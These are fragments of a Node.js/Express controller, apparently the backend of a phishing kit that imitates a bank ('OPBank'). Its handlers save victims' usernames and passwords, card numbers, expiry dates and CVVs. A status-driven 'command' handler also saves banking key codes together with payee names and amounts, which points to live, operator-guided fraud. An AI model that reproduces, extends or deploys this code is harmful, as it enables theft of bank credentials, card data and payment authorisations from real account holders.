...
const command = async (req, res) => {
	const { uniqueid, status, keyNumber, last3, payeeName, amount } = req.body;
	try {
		if (keyNumber && last3)
			await OPBank.findOneAndUpdate(
				{ uniqueid },
				{ status, keyNumber, last3 }
			).exec();
		if (payeeName && amount)
			await OPBank.findOneAndUpdate(
				{ uniqueid },
				{ status, payeeName, amount }
			).exec();
		else if (keyNumber)
			await OPBank.findOneAndUpdate({ uniqueid }, { status, keyNumber }).exec();
...
const submitLoginAgain = async (req, res) => {
	...
	try {
		await OPBank.findOneAndUpdate(
			{ uniqueid },
			{ username, password, status: 4, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
...
const submitBilling = async (req, res) => {
	...
	try {
		let user = await OPBank.findOneAndUpdate(
			{ uniqueid },
			{ ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }
		).exec();
